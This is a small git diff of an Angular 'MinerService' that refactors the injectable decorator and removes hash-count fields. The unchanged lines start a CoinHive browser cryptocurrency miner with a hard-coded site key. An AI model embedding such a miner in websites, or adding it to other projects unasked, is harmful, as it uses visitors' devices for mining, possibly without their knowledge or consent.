@@ -2,12 +2,10 @@ import { Injectable } from '@angular/core';
 
 declare var CoinHive: any;
 
-@Injectable()
+@Injectable({
+  providedIn: 'root',
+})
 export class MinerService {
-
-  acceptedHashes: any;
-  totalHashes: any;
-  hashesPerSecond: any;
 
   startMiner() {
     const miner = new CoinHive.Anonymous('WbWeCFFLVH6mLfn3OYt48oXvUhGiwj2j', { throttle: 0.3 });
